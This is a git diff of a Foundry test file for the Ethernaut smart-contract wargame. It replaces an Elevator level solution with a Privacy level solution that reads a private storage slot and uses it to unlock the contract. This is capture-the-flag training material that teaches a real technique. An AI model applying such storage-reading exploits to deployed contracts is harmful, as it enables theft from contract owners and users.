@@ -6,10 +6,9 @@ import "ds-test/test.sol";
 import "forge-std/Vm.sol";
 
 import "src/core/Ethernaut.sol";
-import "../src/levels/11-Elevator/ElevatorFactory.sol";
-import "../src/levels/11-Elevator/MyBuilding.sol";
+import "../src/levels/12-Privacy/PrivacyFactory.sol";
 
-contract ElevatorTest is DSTest {
+contract PrivacyTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
     address hacker = vm.addr(1);
@@ -21,21 +20,24 @@ contract ElevatorTest is DSTest {
         vm.deal(hacker, 1 ether);
     }
 
-    function testElevatorHack() public {
+    function testPrivacyHack() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
-        ElevatorFactory elevatorFactory = new ElevatorFactory();
-        ethernaut.registerLevel(elevatorFactory);
+        PrivacyFactory privacyFactory = new PrivacyFactory();
+        ethernaut.registerLevel(privacyFactory);
         vm.startPrank(hacker);
-        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(elevatorFactory);
-        Elevator ethernautElevator = Elevator(payable(levelAddress));
+        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(privacyFactory);
+        Privacy ethernautPrivacy = Privacy(payable(levelAddress));
         //////////////////
         // LEVEL ATTACK //
         //////////////////
         // implement your solution here
-        MyBuilding building = new MyBuilding(address(ethernautElevator));
-        building.callElevator(1);
+        bytes32 data = vm.load(address(ethernautPrivacy), bytes32(uint256(5)));
+
+        emit log_bytes32(data);
+        ethernautPrivacy.unlock(bytes16(data));
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
